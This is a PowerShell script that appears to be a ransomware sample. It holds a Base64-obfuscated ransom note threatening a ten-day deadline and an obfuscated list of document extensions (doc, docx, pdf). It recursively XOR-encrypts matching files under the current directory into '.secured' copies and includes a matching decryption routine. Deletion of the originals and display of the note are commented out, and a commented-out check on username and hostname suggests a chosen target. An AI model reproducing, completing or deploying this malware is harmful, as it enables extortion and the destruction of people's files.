#$fileTypes = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$fileTypes = "Ki5kb2MgKi5kb2N4ICoucGRm"

$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$randomBase64String = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$plaintextString = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$secondAlphabetShuffle = @{}
$firstAlphabetShuffle = @{}

For ($x = 65; $x -le 90; $x++) {
    $firstAlphabetShuffle[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function printRansomwareNote {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

function returnFiletypes {
    return (convertFromBase64 $fileTypes).Split(" ")
}
$firstAlphabetShuffle = @{}
For ($x = 97; $x -le 122; $x++) {
    $firstAlphabetShuffle[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

function convertFromBase64 {
    param([string]$userstring)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userstring))
}

$randomBase64StringDecoded = convertFromBase64 $randomBase64String
$plaintextToBase64 = convertFromBase64 $plaintextString

For ($x = 48; $x -le 57; $x++) {
    $firstAlphabetShuffle[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$firstAlphabetShuffle.GetEnumerator() | ForEach-Object {
    $secondAlphabetShuffle[$_.Value] = $_.Key
}

function returnEncryptedByteArray {
    param([byte[]]$firstVariuble, [byte[]]$secondVariuble, [byte[]]$thirdVariuble)
    # The first variuble is the raw bytes of the file
    
    # this is the empty array where the encrypted bytes go
    $encryptedByteArray = [byte[]]::new($firstVariuble.Length)
    
    for ($x = 0; $x -lt $firstVariuble.Length; $x++) {
        $secondVarByteModX = $secondVariuble[$x % $secondVariuble.Length]
        $thirdVarByteModX = $thirdVariuble[$x % $thirdVariuble.Length]
        # iterate over the second and third variubles to xor encrypt the bytes in the first variuble
        $encryptedByteArray[$x] = $firstVariuble[$x] -bxor $secondVarByteModX -bxor $thirdVarByteModX
    }
    return $encryptedByteArray
}

function returnEncryptedBase64Array {
    param([byte[]]$optionOneBytes, [string]$optionTwo, [string]$optionThree)

    if ($optionOneBytes -eq $null -or $optionOneBytes.Length -eq 0) {
        return $null
    }

    $optionTwoBytes = [System.Text.Encoding]::UTF8.GetBytes($optionTwo)
    $optionThreeBytes = [System.Text.Encoding]::UTF8.GetBytes($optionThree)
    $encryptedBytes = returnEncryptedByteArray $optionOneBytes $optionTwoBytes $optionThreeBytes

    return [Convert]::ToBase64String($encryptedBytes)
}

function returnDecryptedByteArray {
    param([byte[]]$firstVariuble, [byte[]]$secondVariuble, [byte[]]$thirdVariuble)
    # The first variuble is the raw bytes of the file
    # this is the empty array where the encrypted bytes go
    $encryptedByteArray = [byte[]]::new($firstVariuble.Length)
    
    for ($x = 0; $x -lt $firstVariuble.Length; $x++) {
        $secondVarByteModX = $secondVariuble[$x % $secondVariuble.Length]
        $thirdVarByteModX = $thirdVariuble[$x % $thirdVariuble.Length]
        # iterate over the second and third variubles to xor encrypt the bytes in the first variuble
        $encryptedByteArray[$x] = $firstVariuble[$x] -bxor $secondVarByteModX -bxor $thirdVarByteModX
    }
    return $encryptedByteArray
}

function returnDecryptedBase64Array {
    param([byte[]]$optionOneBytes, [string]$optionTwo, [string]$optionThree)

    if ($optionOneBytes -eq $null -or $optionOneBytes.Length -eq 0) {
        return $null
    }

    $optionTwoBytes = [System.Text.Encoding]::UTF8.GetBytes($optionTwo)
    $optionThreeBytes = [System.Text.Encoding]::UTF8.GetBytes($optionThree)
    $encryptedBytes = returnEncryptedByteArray $optionOneBytes $optionTwoBytes $optionThreeBytes

    return [Convert]::ToBase64String($encryptedBytes)
}

function o12Vq {
    param([switch]$optionOne,[switch]$optionTwo)

#    try {
        if ($optionOne) { # If option is supplied then do the deed
            foreach ($forLoopVariuble in returnFiletypes) {
#                $fileToEncrypt = "dca01aq2/"
                $fileToEncrypt = pwd
                if (Test-Path $fileToEncrypt) {
                    Get-ChildItem -Path $fileToEncrypt -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$forLoopVariuble$" } |
                        ForEach-Object {
                            $fullFileName = $_.FullName
                            if (Test-Path $fullFileName) {
                            	write-host $fullFileName
                                $fileContents = [IO.File]::ReadAllBytes($fullFileName)
                                $encryptedFileContents = returnEncryptedBase64Array $fileContents $randomBase64StringDecoded $plaintextToBase64
                                [IO.File]::WriteAllText("$fullFileName.secured", $encryptedFileContents)
#                                Remove-Item $fullFileName -Force
                            }
                        }
                }
            }
        }
        if ($optionTwo) { # If option is supplied then undo the deed
            $fileTypes = "Ki5zZWN1cmVk"
            write-host "Attempting decryption"
            foreach ($forLoopVariuble in returnFiletypes) {
#                $fileToEncrypt = "dca01aq2/"
                $fileToEncrypt = pwd
                if (Test-Path $fileToEncrypt) {
                    Get-ChildItem -Path $fileToEncrypt -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$forLoopVariuble$" } |
                        ForEach-Object {
                            $fullFileName = $_.FullName
                            if (Test-Path $fullFileName) {
                            	write-host $fullFileName
				# get the base64 encoded file contents
# ORIGINAL                                $base64fileContents = [IO.File]::ReadAllBytes($fullFileName)
				try {
	                                $base64fileContents = get-content $fullFileName
	                        } catch {
	                        	$base64fileContents = [IO.File]::ReadAllBytes($fullFileName)
	                        }
#                                write-host $base64fileContents # CONFIRMED B64 STRING IS SAVED
                               	# Confirm that bytes are being written to the fileContents var
				$fileContents = [System.Convert]::FromBase64String($base64fileContents)
#				write-host $fileContents # CONFIRMED THIS IS THE CORRECT FORMAT
                                $encryptedFileContents = returnEncryptedBase64Array $fileContents $randomBase64StringDecoded $plaintextToBase64
                                $decryptedFileContents = [System.Convert]::FromBase64String($encryptedFileContents)
                                [System.IO.File]::WriteAllBytes("$fullFileName.decrypted", $decryptedFileContents)
## WORKING DO NOT ALTER OR TOUCH
                            }
                        }
                }
            }
        }
#    }    catch {}
}
# might not use the environment variubles other than to check if its installed in a specific place
#if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -optionOne
#    printRansomwareNote
    o12Vq -optionTwo
#}
